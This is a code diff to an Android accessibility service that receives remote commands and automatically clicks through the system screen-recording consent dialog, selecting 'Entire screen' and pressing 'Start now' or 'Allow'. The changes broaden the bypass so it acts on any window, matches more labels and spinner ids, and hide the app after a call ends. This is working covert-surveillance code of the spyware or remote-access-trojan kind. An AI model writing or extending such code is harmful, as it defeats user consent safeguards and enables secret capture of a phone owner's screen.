@@ -100,9 +100,12 @@ public class RemoteAccessibilityService extends AccessibilityService {
                     } else if ("end_call".equals(command)) {
                         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                         stopService(serviceIntent);
-                        if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
+                        if (MainActivity.getInstance() != null) {
                             MainActivity.getInstance().runOnUiThread(() -> {
-                                MainActivity.getInstance().getWebRTCCompanion().endCall(false);
+                                if (MainActivity.getInstance().getWebRTCCompanion() != null) {
+                                    MainActivity.getInstance().getWebRTCCompanion().endCall(false);
+                                }
+                                MainActivity.getInstance().moveTaskToBack(true);
                             });
                         }
                     } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
@@ -195,13 +198,10 @@ public class RemoteAccessibilityService extends AccessibilityService {
         if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
-            CharSequence pkg = event.getPackageName();
-            if (pkg != null && ("android".contentEquals(pkg) || "com.android.systemui".contentEquals(pkg))) {
-                android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
-                if (root != null) {
-                    processMediaProjectionDialog(root);
-                    root.recycle();
-                }
+            android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                processMediaProjectionDialog(root);
+                root.recycle();
             }
         }
     }
@@ -233,9 +233,11 @@ public class RemoteAccessibilityService extends AccessibilityService {
         if (node == null) return false;
 
         CharSequence text = node.getText();
-        if (text != null) {
-            String lower = text.toString().toLowerCase().trim();
-            if (lower.contains("entire screen") || lower.contains("whole screen") || lower.equals("entire")) {
+        CharSequence desc = node.getContentDescription();
+        String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
+
+        if (!candidate.isEmpty()) {
+            if (candidate.contains("entire screen") || candidate.contains("whole screen") || candidate.contains("full screen") || candidate.contains("all screen") || candidate.equals("entire")) {
                 if (node.isClickable()) {
                     node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                     Log.i(TAG, "Selected 'Entire screen' option!");
@@ -264,9 +266,11 @@ public class RemoteAccessibilityService extends AccessibilityService {
         if (node == null) return false;
 
         CharSequence text = node.getText();
-        if (text != null) {
-            String lower = text.toString().toLowerCase().trim();
-            if (lower.contains("single app") || lower.contains("a single app")) {
+        CharSequence desc = node.getContentDescription();
+        String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
+
+        if (!candidate.isEmpty()) {
+            if (candidate.contains("single app") || candidate.contains("a single app") || candidate.contains("an app")) {
                 if (node.isClickable()) {
                     node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                     Log.i(TAG, "Clicked single app spinner to show Entire screen option!");
@@ -280,7 +284,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
         }
 
         String viewId = node.getViewIdResourceName();
-        if (viewId != null && viewId.contains("screen_share_mode_spinner")) {
+        if (viewId != null && (viewId.contains("screen_share_mode_spinner") || viewId.contains("spinner"))) {
             if (node.isClickable()) {
                 node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                 return true;
@@ -303,9 +307,12 @@ public class RemoteAccessibilityService extends AccessibilityService {
         if (node == null) return false;
 
         CharSequence text = node.getText();
-        if (text != null) {
-            String lower = text.toString().toLowerCase().trim();
-            if (lower.equals("start now") || lower.equals("start") || lower.equals("start recording") || lower.equals("allow")) {
+        CharSequence desc = node.getContentDescription();
+        String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
+
+        if (!candidate.isEmpty()) {
+            if (candidate.equals("start now") || candidate.equals("start") || candidate.equals("start recording") ||
+                candidate.equals("allow") || candidate.contains("start now") || candidate.contains("start recording")) {
                 if (node.isClickable()) {
                     return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                 } else if (node.getParent() != null && node.getParent().isClickable()) {
